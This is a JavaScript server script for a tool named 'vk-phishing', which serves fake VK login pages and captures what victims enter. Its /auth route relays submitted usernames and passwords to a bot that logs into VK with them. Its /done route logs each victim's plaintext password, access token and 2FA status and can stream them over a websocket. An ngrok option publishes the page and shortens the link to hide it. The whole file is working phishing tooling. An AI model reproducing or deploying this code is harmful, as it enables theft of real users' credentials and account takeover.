const yargs = require('yargs')

const consola = require('consola')

const Koa = require('koa')
const Router = require('@koa/router')
const bodyParser = require('koa-bodyparser')

const { VK } = require('vk-io')
const io = require('socket.io')()

const chalk = require('chalk')
const userbot = require('./userbot')
const { R_SUCCESS, R_REQUIRE_2FA } = require('./auth-constants')
const ngrok = require('./ngrok')

const app = new Koa()
const router = new Router()

// Import and Set Nuxt.js options

const { getShortUrl, afterLogin } = require('./aye-kosmonavt-yaml')

async function start(args) {
  app.use(bodyParser())

  const renderers = require('./renderers/index')

  if (args.listRenderers) {
    consola.info('Renderers: ')

    let i = 0

    for (const r of Object.keys(renderers)) {
      consola.log(`${++i}) ${r}`)
    }

    return 0
  }

  if (!(args.renderer in renderers)) {
    throw new Error(`Renderer ${args.renderer} is not exists`)
  }

  const { port, host, renderer } = await renderers[args.renderer]()

  router.post('/done', async (ctx) => {
    const vk = new VK({
      token: ctx.request.body.token,
      apiVersion: '5.103',
      apiHeaders: {
        'User-Agent': ctx.headers['user-agent'] || 'vkApi/1.0'
      }
    })

    const [currentUser] = await vk.api.users.get()

    consola.info({ message: 'Got new account', badge: true })
    consola.info(`Name: ${currentUser.first_name} ${currentUser.last_name}`)
    consola.info(`Login: ${ctx.request.body.username}`)
    consola.info(`Password: ${ctx.request.body.password}`)
    if (ctx.req['2fa']) {
      consola.error('2fa: Enabled')
    } else {
      consola.success('2fa: Disabled')
    }
    consola.info(`Token: ${ctx.request.body.token}`)

    if (args.websocket)
      io.sockets.emit('user_successful_auth', {
        ...currentUser,
        ...ctx.request.body
      })

    ctx.body = 'ok'
  })

  router.post('/auth', async (ctx) => {
    consola.log()

    consola.info({
      label: true,
      message: 'Trying authenticate with credentials'
    })

    const input = chalk.bold.blueBright('>')
    const outputSuccess = chalk.bold.green('< ')
    const outputFail = chalk.bold.red('< ')

    consola.log(`${input} Login: ${ctx.request.body.username}`)
    consola.log(`${input} Password: ${ctx.request.body.password}`)

    const json = await userbot(ctx.request.body)

    if (json.status === R_SUCCESS) {
      consola.log(outputSuccess + 'Success!')
    } else if (json.status === R_REQUIRE_2FA) {
      consola.log(outputFail + 'Required 2FA!')
    } else {
      consola.log(outputFail + 'Failed!')
    }

    consola.log()

    if (args.websocket) io.sockets.emit('user_auth_attempt', json)

    ctx.body = json
  })

  router.get('/exit', async (ctx) => ctx.redirect(await afterLogin()))

  consola.ready({
    message: `Server listening on http://${host}:${port}`,
    badge: true
  })

  if (args.ngrok) {
    try {
      const publicUrl = await ngrok(port)
      consola.info(`Listening public url: ${publicUrl}`)
      const shortUrl = await getShortUrl(publicUrl)
      consola.info(`Shorten url is: ${shortUrl}`)

      if (args.websocket) {
        io.sockets.emit('ngrok_connected', { publicUrl, shortUrl })
      }
    } catch (e) {
      if (args.websocket) {
        io.sockets.emit('ngrok_fail_start', e)
      }

      consola.error(e)
    }
  }

  app.use(router.routes())
  app.use(router.allowedMethods())
  app.use(renderer)

  app.listen(port, host)

  if (args.websocket) {
    const wsPort = port + 100

    io.listen(wsPort)

    consola.ready({
      message: `WebSocket server listening on ws://localhost:${wsPort}`,
      badge: true
    })
  }
}

start(
  yargs
    .scriptName('vk-phishing')
    .alias('l', 'list-renderers')
    .alias('r', 'renderer')
    .alias('ws', 'websocket')
    .default('r', 'static').argv
)

process
  .on('unhandledRejection', (reason, p) => {
    consola.error(reason, 'Unhandled Rejection at Promise', p)
  })
  .on('uncaughtException', (err) => {
    consola.error(err, 'Uncaught Exception thrown')
    process.exit(1)
  })

module.exports = function() {
  throw new Error('You can not require this package')
}
